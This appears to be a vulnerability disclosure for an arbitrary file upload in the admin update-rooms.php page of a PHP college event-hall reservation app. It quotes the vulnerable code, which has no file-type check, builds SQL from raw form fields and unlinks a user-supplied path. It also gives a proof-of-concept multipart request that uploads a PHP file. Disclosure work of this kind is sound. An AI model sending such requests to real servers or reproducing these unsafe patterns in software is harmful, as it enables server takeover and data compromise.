# MAGESH-K21 / Online-College-Event-Hall-Reservation-System - Arbitrary File Upload update-rooms.php

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://github.com/MAGESH-K21/Online-College-Event-Hall-Reservation-System/

## Affected Component
> /admin/update-rooms.php

## Code
```php
if(isset($_POST['update'])){
                        $room_id=$_POST['roomid'];
                        $roomname1=$_POST['roomname'];
                        $roomnum1=$_POST['roomnum'];
                        $location1=$_POST['Location'];
                        $capacity1=$_POST['Capacity'];
                        $description1=$_POST['Description'];
                        $current_image=$_POST['current_image'];
                        if(isset($_FILES["image"]["name"])){
                            $image_name=$_FILES['image']['name'];
                            //echo $image_name;
                            if($image_name!=''){
                                $path="../images/".$current_image;
                                $remove=unlink($path);
                                $ext=strtolower(pathinfo($image_name,PATHINFO_EXTENSION));
                                $image_name=$room_id.'.'.$ext;
                                $source=$_FILES['image']['tmp_name'];
                                $destination='../images/'.$image_name;
                                $upload=move_uploaded_file($source,$destination);
                            }else{
                                $image_name=$current_image;
                            }
                        }else{
                            $image_name=$current_image;
                        }
                        $sql2="UPDATE tbl_rooms SET 
                        room_name='$roomname1',
                        capacity='$capacity1',
                        location='$location1',
                        description='$description1',
                        room_number='$roomnum1',
                        img_name='$image_name' WHERE room_id='$room_id'";
                        $res1=mysqli_query($conn,$sql2);
                        //echo $sql2;
                        if($res1==True){
                            ?>
                            <script>
                                alert("Updated Successfully");
                                window.location.href="rooms.php?id=<?php echo $id; ?>"
                            </script>
                            <?php
                        }
                        else{
                            ?>
                            <script>
                                alert("Already Exists");
                                window.location.href="update-rooms.php?id=<?php echo $id; ?>&room_id=<?php echo $room_id1; ?>";
                            </script>
                            <?php

                        }
                    }
```

## Proof of Concept
**HTTP Request Example**
``` http request
POST /admin/update-rooms.php HTTP/1.1
Host: 127.0.0.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 1020


------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="update"

NoChizPlz
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="roomid"

NoChizPlz
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="roomname"

NoChizPlz
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="roomnum"

NoChizPlz
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="Location"

NoChizPlz
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="Capacity"

NoChizPlz
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="Description"

1
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="current_image"

92.jpeg
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="image"; filename="nochizplz.php"
Content-Type: text/php

<?php phpinfo(); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW
```

## Screenshot

